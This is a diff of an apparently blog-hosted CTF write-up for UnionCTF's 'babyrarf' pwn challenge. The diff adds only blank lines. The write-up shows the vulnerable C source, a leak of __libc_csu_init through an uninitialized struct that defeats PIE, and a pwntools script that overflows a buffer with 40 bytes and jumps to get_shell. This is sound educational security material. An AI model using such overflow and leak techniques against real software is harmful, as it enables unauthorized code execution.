@@ -90,7 +90,8 @@ Let&rsquo;s take a look at the src!
 <p>This Write-Up is about de first pwn challenge of <a href="https://ctf.cr0wn.uk">unionctf</a>: <a href="">babyrarf</a>.
 It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
 <p>Let&rsquo;s take a look at the src!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
@@ -195,6 +196,7 @@ attack <span style="color:#50fa7b">choose_attack</span>(){
     fgets(player.name, <span style="color:#bd93f9">48</span>, stdin);
     <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 }
+
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
 <pre><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
@@ -258,7 +260,8 @@ Fortify                       : ✘
 RelRO                         : Partial
 </code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">attack <span style="color:#50fa7b">choose_attack</span>(){
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+attack <span style="color:#50fa7b">choose_attack</span>(){
     attack a;
     <span style="color:#8be9fd">int</span> id;
     <span style="color:#6272a4">/* Some print stuff */</span>
@@ -282,17 +285,21 @@ To do so we can mind the code of <code>choose_attack</code> function:</p>
     }
     <span style="color:#ff79c6">return</span> a;
 }
+
 </code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
 And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#6272a4">/* ... */</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+    <span style="color:#6272a4">/* ... */</span>
     a <span style="color:#ff79c6">=</span> choose_attack();
     printf(<span style="color:#f1fa8c">&#34;You choose attack %llu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.id);
     printf(<span style="color:#f1fa8c">&#34;You deal %llu dmg</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.dmg);
     <span style="color:#6272a4">/*...*/</span>
+
 </code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
 And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
 So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 
 <span style="color:#6272a4">#p = process(&#34;babyrarf&#34;)</span>
 
@@ -339,6 +346,7 @@ r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1
 <span style="color:#6272a4">#gdb.attach(p.pid)</span>
 r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">40</span> <span style="color:#ff79c6">+</span> p64(e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;get_shell&#39;</span>] <span style="color:#ff79c6">+</span> base))
 r<span style="color:#ff79c6">.</span>interactive()
+
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
